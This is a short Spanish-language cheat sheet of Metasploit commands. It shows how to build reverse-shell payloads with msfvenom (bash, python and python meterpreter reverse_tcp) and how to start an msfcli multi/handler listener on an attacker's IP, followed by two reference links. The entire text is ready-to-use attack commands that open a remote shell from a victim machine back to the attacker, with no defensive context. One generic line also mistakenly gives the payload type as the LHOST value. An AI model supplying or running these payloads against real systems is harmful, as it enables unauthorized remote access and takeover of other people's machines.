--Comando para el handler segun el payload elegido:

# msfcli exploit/multi/handler PAYLOAD=<Tipo de Payload> LHOST=<IP Atacante> E

--Tipos de payload:
	--> cmd/unix/reverse_bash
	--> cmd/unix/reverse_python
    --> python/meterpreter/reverse_tcp

	--> # msfvenom -l

--Comando para el payload

# msfvenom -p <Tipo de Payload> LHOST=<Tipo de Payload> LPORT=<Puerto A Conectarse> -f raw > shell.py

--Comandos a utilizar (Actualizado):

# msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP Atacante> LPORT=<Puerto A Conectarse> -f raw > meterpreter.py

# msfcli exploit/multi/handler PAYLOAD=python/meterpreter/reverse_tcp LHOST=<IP Atacante> E

--Referencia:

~http://netsec.ws/?p=331
~https://www.phillips321.co.uk/2013/10/22/one-line-python-meterpreter-reverse-shell/
